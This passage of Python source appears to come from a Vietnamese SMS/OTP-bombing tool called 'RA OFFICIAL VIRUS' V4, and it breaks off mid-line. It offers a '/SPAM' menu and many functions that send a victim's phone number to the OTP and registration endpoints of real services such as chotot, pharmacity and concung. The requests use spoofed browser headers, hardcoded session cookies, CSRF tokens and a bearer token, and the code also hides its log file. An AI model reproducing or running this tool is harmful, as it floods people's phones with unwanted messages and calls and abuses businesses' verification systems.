    # Đặt thuộc tính ẩn cho file
    if os.name == 'nt':  # Windows
        import ctypes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(log_path, FILE_ATTRIBUTE_HIDDEN)
    else:  # Unix/Linux/Mac
        try:
            os.rename(log_path, hidden_file_path)
        except OSError:
            os.rename(log_path, hidden_file_path)


file()
ngay = 0
def exit1():
    exit()

def help1():
    os.system('cls')
    banner = '''
            ════ H E L P ════

/SPAM : ĐỂ DÙNG SPAM SMS CỦA RA OFFICIAL VIRUS
/VER  : PHIÊN BẢN
/INFO : ADMIN INFO
/EXIT : IF YOU WANT TO EXIT THIS PROGRAMME
/CHK  : IF YOU WANT TO CHECK THE DATE OF YOUR KEY

                           '''
    print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.yellow)), Center.XCenter(banner.center(100))))
def info():
    os.system('cls')
    banner = '''
           ════ I N F O ════

          RA OFFICIAL VIRUS: ADMIN
           GROUP SUPPORT ERROR
        https://zalo.me/g/hnukjv833
LANGUAGE CODE:PYTHON, JAVASCRIPT, C++, HTML,..

'''
    print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.yellow)), Center.XCenter(banner.center(100))))                            
def ver():
    os.system('cls')
    banner = '''
        ════ V E R ════

SOME INFORMATIONS ABOUT THIS TOOL
VERSION : V4
MADE BY RA OFFICIAL VIRUS
┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                                 │
│                              ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗                              │
│                              ██║   ██║██║██╔══██╗██║   ██║██╔════╝                              │
│                              ██║   ██║██║██████╔╝██║   ██║███████╗                              │
│                              ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║                              │
│                               ╚████╔╝ ██║██║  ██║╚██████╔╝███████║                              │
│                                ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                              │
│                                                                             Boot Script 2.0     │
└─────────────────────────────────────────────────────────────────────────────────────────────────┘
                    BẢN V4
THANKS WHEN YOU HAVE SOME QUESTIONS
RELEVANT TO THIS TOOL

                               '''
    print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.yellow)), Center.XCenter(banner.center(100))))
def chk(day,status):
    os.system('cls')
    banner = '''
  ════ C H K ════
                                      
  WELCOME BACK BRO
YOUR DATE KEY : ''',day,'DAY','''
   STATUS : ''',status,'''
  THANKS YOU AND BYE
  
                                     '''
    print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.yellow)), Center.XCenter(banner.center(100))))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
def regthantaioi(sdt):
  headers = {
    'Host': 'api.thantaioi.vn',
    #'content-length': '186',
    'accept-language': 'vi',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://thantaioi.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thantaioi.vn/user/registration/reg1',
    #'accept-encoding': 'gzip, deflate, br'
}
  data = json.dumps(
  {"full_name":"Nguyễn Thanh Nam","first_name":"Nam","last_name":"Nguyễn","mobile_phone":"84"+sdt[1:],"target_url":"thantaioi.vn/?utm_source=google&utm_medium=organic&utm_campaign=organic"})
  response = requests.post('https://api.thantaioi.vn/api/user', data=data,headers=headers).json()
  
  global tokenthantaioi
  tokenthantaioi = response['token']
def takomo(sdt):
  headers = {
    'Host': 'lk.takomo.vn',
    # 'content-length': '63',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://lk.takomo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1322990889.1691892176; _gid=GA1.2.1712469938.1691892180; _gat_UA-187725374-2=1; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjRkMTM2YmI3LWMwZTMtNDViYi04Y2RlLWVmZTEwMDNjOTcyMSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5OTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1691892183149.361720121; _tt_enable_cookie=1; _ttp=rolXX5eW4teiY32zQW6AhD4vgnU; _fw_crm_v=c75bd27f-15ee-4b55-c659-dcb46da7d3e8; _hjSessionUser_2281843=eyJpZCI6IjBkZmZkMTM5LTdkYzYtNTQ1OS04Njg5LTNmYmMwZjg4YjIyNSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5MTAsImV4aXN0aW5nIjp0cnVlfQ==; _ga_K15C064VTW=GS1.2.1691892186.1.1.1691892195.51.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDMzODYwNzI0NQ.AuMP_7aZ-Nzl2IRO_r4s-uc-YPsmrSqJGHqyMw_WMQ8; _gat_UA-187725374-1=1; _ga=GA1.1.2029320197.1691892180; _ga_ZN0EBP68G5=GS1.1.1691892223.1.0.1691892224.59.0.0; _ga_ZBQ18M247M=GS1.1.1691892181.1.1.1691892225.16.0.0; _ga_03H0F9NHEX=GS1.2.1691892225.1.0.1691892226.59.0.0',
}
  data = '{"data":{"phone":"sdt","code":"resend","channel":"ivr"}}'.replace('sdt',sdt)
  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers, data=data).text
def bibabo(sdt):
  headers = {
    'Host': 'bibabo.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '64',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://bibabo.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://bibabo.vn/user/signupPhone',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_ui_bi_=eyJpdiI6IkZQNG9kOUZEVHdHRkw1cVBOOTF4Smc9PSIsInZhbHVlIjoibHpjZTlpbEhtN0VNVFhKNFwvS2V3XC85ZTIrUlwvNk5HYU1WdzRYeWpOdmhiaz0iLCJtYWMiOiI1NGQyZmM3NjE4MzE2NzQ3NGMyMjQ4M2FiZTBhN2E3M2EzZTJhMjM5NDJkMzcxZGU4OThiYWJhYmQ1YmFiYjAxIn0%3D; _gid=GA1.2.261767571.1691888491; mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24device_id%22%3A%20%22189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _fbp=fb.1.1691888491341.1918851086; _gat=1; _ga=GA1.1.1813680014.1691888491; _ga_B05J0DJ8VM=GS1.1.1691888492.1.1.1691888493.0.0.0; gaVisitorUuid=cdea3535-e7d1-4fe7-823c-26aaab984e3d; XSRF-TOKEN=eyJpdiI6Iml6b1ROSUZXV1JoQWE5azFNRjRpYVE9PSIsInZhbHVlIjoicEhqODdzbUM1OUZhcW5jZmxzMVlmSjM2VmRVWE5PRTQ1ZE9RcEtub1ZybVJxZU9ZMCtyWGpKTnd2eFFGckJnV2NaWW5IdWpETTdMZWRxU1FHU3lmb3c9PSIsIm1hYyI6ImYwYTRiNTA2N2NjY2VjNDZmYTA1NGNlYzQxOGVjYTU5OWNhNTlmM2I4NmY1Mzc0MjQzNzUyMTNhM2VkOWMyNTYifQ%3D%3D; laravel_session=eyJpdiI6Im1IUUdLRGF0TjlpckljamkyS0ZxdEE9PSIsInZhbHVlIjoiV3JyaWduWmFxclNxcUUyK2FNSnZjMHFqOUJRd01cL1hWY2FcL09oNWtPZWVBUGVFM3VzV0lSSkYxQlREb1krQ1libUxjaXNZTlhqTmc0TnRwWlJjSVwvenc9PSIsIm1hYyI6IjkxZGMxOWRhZThlODMxNmUwMjM5MjBhNWRkY2I1MTA2MWFhNDEzYjllNTllMTEzMDUzNzhjZmM2NTJlOTBjNjgifQ%3D%3D',
}
  data = {
    'phone': f'{sdt}',
    '_token': '3ekXaZ227m0YVvU8gNY8U3XIBHDT2vTKABg5ZaBS',
}
  response = requests.post('https://bibabo.vn/user/verify-phone', headers=headers, data=data).text
def cashbar(sdt):
  headers = {
    'Host': 'api.cashbar.tech',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.cashbar.work',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.cashbar.work/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': '7f38e65de6b47136eaa373feade6cd33',
  }
  response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()
def chotot(sdt):
  headers = {
    'Host': 'gateway.chotot.com',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://id.chotot.com',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://id.chotot.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, data=data).json()
def pizzacompany(sdt):
  cookies = {
    '_gcl_au': '1.1.607819339.1691276885',
    '_ga': 'GA1.2.453948248.1691276886',
    '_gid': 'GA1.2.698696022.1691276886',
    '_tt_enable_cookie': '1',
    '_ttp': 'bwCYo8Ir1_CxxhKbysJDt5JtlQ7',
    '_fbp': 'fb.1.1691276888170.1960321660',
    '.Nop.Antiforgery': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8',
    '.Nop.Customer': 'ccaefc12-aefb-4b4d-8b87-776f2ee9af1f',
    '.Nop.TempData': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  headers = {
    'Host': 'thepizzacompany.vn',
    # 'content-length': '199',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://thepizzacompany.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thepizzacompany.vn/Otp',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.607819339.1691276885; _ga=GA1.2.453948248.1691276886; _gid=GA1.2.698696022.1691276886; _tt_enable_cookie=1; _ttp=bwCYo8Ir1_CxxhKbysJDt5JtlQ7; _fbp=fb.1.1691276888170.1960321660; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8; .Nop.Customer=ccaefc12-aefb-4b4d-8b87-776f2ee9af1f; .Nop.TempData=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew',
  }
  data = {
    'phone': f'{sdt}',
    '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
  }
  response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()
def onecredit(sdt):
  cookies = {
    'SN5c8116d5e6183': 'vd0peh2340qie49h8hksc6mktb',
    'OnCredit_id': '64cc576f3fcca5.61640209',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef': '1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=',
    '_fbp': 'fb.1.1691113338133.1121666643',
    'GN_USER_ID_KEY': '1b7eaaea-150b-4d8d-8250-69d546c1c1cb',
    '_ga_462Z3ZX24C': 'GS1.1.1691244602.2.1.1691244602.60.0.0',
    '_ga': 'GA1.2.148691698.1691113336',
    '_gid': 'GA1.2.1794411839.1691244604',
    '_gat_UA-139625802-1': '1',
    'GN_SESSION_ID_KEY': '43953d57-7d12-402f-ae07-ad1786e8ca8b',
    '_ga_4RZFMB042P': 'GS1.2.1691244607.2.0.1691244607.60.0.0',
  }
  headers = {
    'Host': 'oncredit.vn',
    # 'content-length': '231',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://oncredit.vn',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://oncredit.vn/registration',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'SN5c8116d5e6183=vd0peh2340qie49h8hksc6mktb; OnCredit_id=64cc576f3fcca5.61640209; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=1eoY0fSNX4knqqaR+yewjR0dHrPCV8i0u+EA2ZEdAag=; _fbp=fb.1.1691113338133.1121666643; GN_USER_ID_KEY=1b7eaaea-150b-4d8d-8250-69d546c1c1cb; _ga_462Z3ZX24C=GS1.1.1691244602.2.1.1691244602.60.0.0; _ga=GA1.2.148691698.1691113336; _gid=GA1.2.1794411839.1691244604; _gat_UA-139625802-1=1; GN_SESSION_ID_KEY=43953d57-7d12-402f-ae07-ad1786e8ca8b; _ga_4RZFMB042P=GS1.2.1691244607.2.0.1691244607.60.0.0',
  } 
  params = {
    'ajax': '',
  }
  data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': f'{sdt}',
    'data[email]': 'kdish12@gmail.com',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': 'CSRFGuard_ajax',
    'CSRFToken': '59sZQFn8SF73FiA6bifZRTdRE2Eand5G77e93NDzfiKiRSH3Tbhe4tSdB3yHD2sf',
  }
  response = requests.post('https://oncredit.vn/', params=params, cookies=cookies, headers=headers, data=data).json()
def concung(sdt):
  cookies = {
    'PHPSESSID': 'ij419v9ov5ug09ui6t5v6hul56',
    '6f1eb01ca7fb61e4f6882c1dc816f22d': 'T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D',
    '__utmc': '65249340',
    '__utmz': '65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '_ga': 'GA1.1.1576173301.1691112237',
    '_gcl_au': '1.1.601691012.1691112237',
    '_fbp': 'fb.1.1691112237077.759562086',
    '_tt_enable_cookie': '1',
    '_ttp': 'JyO6InY4cht34vkn0PUDBvJMCx5',
    '__utma': '65249340.412064474.1691112234.1691112234.1691138671.2',
    '__utmt': '1',
    'Srv': 'cc205|ZMy49|ZMy4w',
    '__utmb': '65249340.3.10.1691138671',
    '_ga_DFG3FWNPBM': 'GS1.1.1691138672.2.1.1691138724.8.0.0',
    '_ga_BBD6001M29': 'GS1.1.1691138674.2.1.1691138726.8.0.0',
  }
  headers = {
    'Host': 'concung.com',
    # 'content-length': '167',
    'accept': '*/*',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://concung.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://concung.com/dang-nhap.html',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'PHPSESSID=ij419v9ov5ug09ui6t5v6hul56; 6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DBpy7szeD03E%3DXv5zU4fvoPk%3DptVtroTCTyo%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3Dc7gCysNyQxY%3DCNgWpQ5YeKY%3DD7U33jY70Ks%3D; __utmc=65249340; __utmz=65249340.1691112234.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _ga=GA1.1.1576173301.1691112237; _gcl_au=1.1.601691012.1691112237; _fbp=fb.1.1691112237077.759562086; _tt_enable_cookie=1; _ttp=JyO6InY4cht34vkn0PUDBvJMCx5; __utma=65249340.412064474.1691112234.1691112234.1691138671.2; __utmt=1; Srv=cc205|ZMy49|ZMy4w; __utmb=65249340.3.10.1691138671; _ga_DFG3FWNPBM=GS1.1.1691138672.2.1.1691138724.8.0.0; _ga_BBD6001M29=GS1.1.1691138674.2.1.1691138726.8.0.0',
  }
  data = {
    'ajax': '1',
    'classAjax': 'AjaxLogin',
    'methodAjax': 'sendOtpLogin',
    'customer_phone': f'{sdt}',
    'id_customer': '1',
    'static_token': 'e633865a31fa27f35b8499e1a75b0a76',
    'momoapp': '0',
    'back': 'khach-hang.html',
  }
  response = requests.post('https://concung.com/ajax.html',cookies=cookies, headers=headers,data=data).json()
def y360(sdt):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '22',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _gat_gtag_UA_211029013_1=1; _fbp=fb.1.1691134636760.1633963715; _ga=GA1.1.329512893.1691134633; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691134646.0.0.0; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691134667.0.0.0',
    }
  data = '{"phone":"sdt"}'.replace("sdt",sdt)
  response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
  global valuey360
  valuey360 = response['errors']
def y360rs(sdt):
  headers = {
    'Host': 'y360.vn',
    # 'content-length': '689',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://y360.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://y360.vn/hoc/register/code-verify/dbde2f96-3299-11ee-a400-0242ac150006',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.977893193.1691134633; _gid=GA1.2.1747107574.1691134633; _fbp=fb.1.1691134636760.1633963715; _gat_gtag_UA_211029013_1=1; _ga_M7ZN50PQ1V=GS1.1.1691134632.1.1.1691135104.0.0.0; _ga=GA1.1.329512893.1691134633; _ga_BS2V9QEV6V=GS1.1.1691134633.1.1.1691135122.0.0.0',
  }
  data = valuey360.encode()
  response = requests.post('https://y360.vn/api/v1/user/resendCode', data=data, headers=headers).json()
def phamacy(sdt):
  headers = {
    'Host': 'api-gateway.pharmacity.vn',
    # 'content-length': '36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': '*/*',
    'origin': 'https://www.pharmacity.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.pharmacity.vn/',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phone":"sdt","referral":""}'.replace("sdt",sdt)
  response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', data=data,headers=headers)
def vayvnd(sdt):
  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
  head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
def ubofood(sdt):
  headers = {
    'Host': 'ubofood.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '54',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://ubofood.com',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://ubofood.com/register',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; 